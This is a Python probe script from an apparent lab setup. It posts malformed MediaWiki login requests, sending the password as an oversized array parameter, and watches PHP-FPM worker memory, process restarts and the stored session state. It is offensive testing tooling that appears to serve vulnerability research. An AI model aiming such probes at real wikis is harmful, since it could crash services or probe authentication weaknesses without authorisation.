#!/usr/bin/env python3
"""POST Special:UserLogin with a raw (already-encoded) body; report status + session store."""
import os, re, sqlite3, subprocess, sys, time, zlib
import login_probe as L
import fpmstat

LAB = os.path.dirname(os.path.abspath(__file__))

def post_raw(cookie, body, outname="raw.raw"):
    out = os.path.join(LAB, "probe_tmp", outname)
    bfile = os.path.join(LAB, "probe_tmp", outname + ".body")
    open(bfile, "wb").write(body)
    p = subprocess.run([sys.executable, os.path.join(LAB, "fcgi.py"),
                        "--method", "POST", "--uri", "/index.php?title=Special:UserLogin",
                        "--body", bfile, "--cookie", cookie, "--chunk-size", "65535",
                        "--out", out], capture_output=True, text=True, timeout=300)
    if not os.path.exists(out):
        return {"status": "NOOUT", "stderr": p.stderr[-800:]}
    raw = open(out, "rb").read()
    st = re.search(r"client: app_status=(\S+)", p.stderr)
    first = raw.split(b"\r\n", 1)[0].decode("latin1", "replace") if raw else ""
    return {"status": st.group(1) if st else p.stderr, "first": first, "len": len(raw)}

def session(sid):
    c = sqlite3.connect(os.path.join(LAB, "data", "wikicache.sqlite"))
    r = c.execute("select value from objectcache where keyname like ?",
                  ("%MWSession:" + sid,)).fetchone()
    if not r:
        return None
    v = r[0]
    try:
        d = zlib.decompress(v, -15)
    except Exception:
        d = v
    return {"blob": len(v), "inflated": len(d),
            "authn": b"AuthManager::authnState" in d,
            "prefix": d[:100]}

def main():
    size = int(sys.argv[1]) if len(sys.argv) > 1 else 0
    name = sys.argv[2] if len(sys.argv) > 2 else "Admin"
    g = L.get_login()
    sid = g["sid"]
    pw = b"A" * size if size else b"x"
    body = (b"title=Special:UserLogin&authAction=login&wploginattempt=Log+in"
            b"&wpName=" + name.encode() + b"&wpPassword%5B%5D=" + pw +
            b"&wpRemember=1&wpEditToken=" + b"&wpLoginToken=" +
            g["token"].encode().replace(b"+", b"%2B") + b"&force=")
    before = [p.get("pid") for p in fpmstat.status()]
    r = post_raw(g["cookie"], body, "arr_%d.raw" % size)
    time.sleep(0.2)
    after = fpmstat.status()
    print("sid", sid, "status", r["status"], "len", r["len"])
    print("pids", before, "->", [p.get("pid") for p in after])
    print("mem", [(p.get("pid"), p.get("last request memory")) for p in after])
    print("session", session(sid))
    out = os.path.join(LAB, "probe_tmp", "arr_%d.raw" % size)
    if os.path.exists(out):
        raw = open(out, "rb").read()
        bodytxt = raw.split(b"\r\n\r\n", 1)[-1].decode("utf-8", "replace")
        for m in re.finditer(r'<(?:p|div)[^>]*class="[^"]*(?:error|mw-message)[^"]*"[^>]*>(.*?)</(?:p|div)>',
                             bodytxt, re.S):
            txt = re.sub(r"<[^>]+>", "", m.group(1)).strip()
            if txt:
                print("msg:", txt[:200])

if __name__ == "__main__":
    main()
